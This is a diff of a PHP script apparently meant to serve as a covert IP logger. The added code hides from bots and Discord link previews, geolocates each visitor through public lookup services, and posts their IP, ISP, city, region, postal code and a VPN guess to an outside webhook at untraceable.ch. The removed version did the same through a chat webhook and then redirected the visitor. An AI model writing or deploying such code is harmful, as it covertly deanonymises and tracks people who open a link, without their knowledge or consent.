@@ -1,45 +1,94 @@
-<?php include("logger.php"); ?>
+
+
+
+
 <?php
-# created by Carlostkd
-$bd1  = $_SERVER['HTTP_USER_AGENT'];
-if(preg_match('/bot|Discord|robot|curl|spider|koj bot|crawler|^$/i', $bd1)) { # get ride to the bots
-die();
-}
+
+
+
+        $webhookurl = "https://untraceable.ch/.web/hook.php";
+
+
+
+        $ip = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
+
+
+        $browser = $_SERVER['HTTP_USER_AGENT'];
+
+
+        if(preg_match('/bot|Discord|robot|curl|spider|bot roj|crawler|^$/i', $browser)) {
+
+
+            exit();
+
+
+        }
+
+
+        $TheirDate = date('d/m/Y');
+
+
+        $TheirTime = date('G:i:s');
+
+
+        $details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
+
+
+        $vpnCon = json_decode(file_get_contents("https://json.geoiplookup.io/{$ip}"));
+
+
+        if($vpnCon->connection_type==="Corporate"){
+
+
+            $vpn = "Yes (Double Again: $details->isp)";
+
+
+        }else{
+
+
+            $vpn = "No (Double Again: $details->isp)";
+
+
+        }
+
+
+        $flag = "https://www.countryflags.io/{$details->countryCode}/shiny/64.png";
+
+
+        $data = "**IP:** $ip\n**ISP:** $details->isp\n**Date:** $TheirDate\n**Time:** $TheirTime \n**Location:** $details->city \n**Region:** $details->region\n**Country** $details->country\n**Postal Code:** $details->zip\n**IsVPN?** $vpn  (Possible False-Postives)";
+
+
+
+        $json_data = array ('content'=>"$data", 'username'=>"Visited From: $details->country", 'avatar_url'=> "$flag");
+
+
+        $make_json = json_encode($json_data);
+
+
+        $ch = curl_init( $webhookurl );
+
+
+
+        curl_setopt( $ch, CURLOPT_POST, 1);
+
+
+        curl_setopt( $ch, CURLOPT_POSTFIELDS, $make_json);
+
+
+        curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
+
+
+        curl_setopt( $ch, CURLOPT_HEADER, 0);
+
+
+        curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
+
+
+
+        $response = curl_exec( $ch );
+
+
+
 ?>
-<?php
-$IP = $_SERVER['REMOTE_ADDR']; # get ip
-$scan = json_decode(file_get_contents('http://ip-api.com/json/'.$IP));
 
-
-$message = json_encode([ # prepare the message
-    'content' => 'IP lOGGER',
-    'username' => $IP,
-    'embeds' => [
-        [
-            'title' => 'IPLogger',
-            'description' => 'New IP logged
-'.$IP.'
-
-*Browser*
-'.$_SERVER['HTTP_USER_AGENT'] # get browser fingerprint
-            ]
-        ]
-    ]);
-
-$ch = curl_init( $webhook ); # lets send it back to us
-curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
-curl_setopt( $ch, CURLOPT_POST, 1);
-curl_setopt( $ch, CURLOPT_POSTFIELDS, $message);
-curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt( $ch, CURLOPT_HEADER, 0);
-curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
-
-$response = curl_exec( $ch );
-curl_close( $ch );
-?>
-<?php 
-if(empty($redirect) === false) {
-header("location:$redirect");
-die();
-}
-?>
+p, li { white-space: pre-wrap; }
